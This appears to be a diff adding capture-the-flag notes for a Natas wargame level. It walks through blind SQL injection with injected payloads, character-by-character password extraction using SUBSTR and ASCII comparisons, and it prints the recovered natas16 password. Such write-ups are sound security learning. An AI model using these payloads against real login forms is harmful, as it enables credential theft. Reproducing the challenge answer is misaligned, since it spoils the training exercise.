@@ -1,0 +1,35 @@
+Blind SQL injection. There's a yes/no response to a query we will use.
+
+References:
+http://ha.xxor.se/2011/06/speeding-up-blind-sql-injections-using.html
+http://forum.intern0t.org/web-hacking-war-games/818-blind-sql-injection.html
+
+Confirm Blind SQL injection:
+--> test" OR "1"= "1  --> 'This user exists'
+
+Executing query: SELECT * from users where username="test" OR "1"= "1"
+
+Find valid usernames username:
+--> test" OR SUBSTR(username, 1, 1) = "a
+SELECT * from users where username="test" OR SUBSTR(username, 1, 1) = "a"
+This user exists.
+
+Find valid username/password combinations:
+--> test" OR SUBSTR(username, 1, 1) = "a" AND SUBSTR(password, 1, 1) = "h
+
+Executing query: 
+SELECT * from users where username="test" OR SUBSTR(username, 1, 1) = "a" AND SUBSTR(password, 1, 1) = "h"
+This user exists
+
+So we can guess password letter by letter. We expect a 32 letters password as in the 
+previous levels.
+We know that user "natas16" exists.
+
+We'll guess the password using the following query, starting manually and automating:
+natas16" AND ASCII(SUBSTR(password, 1, 1)) < 128 AND "1" = "1
+
+..than changing the position of the letter from the password, and the binary ascii code.
+
+Details in the guess.py code.
+
+natas16 password:  3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L
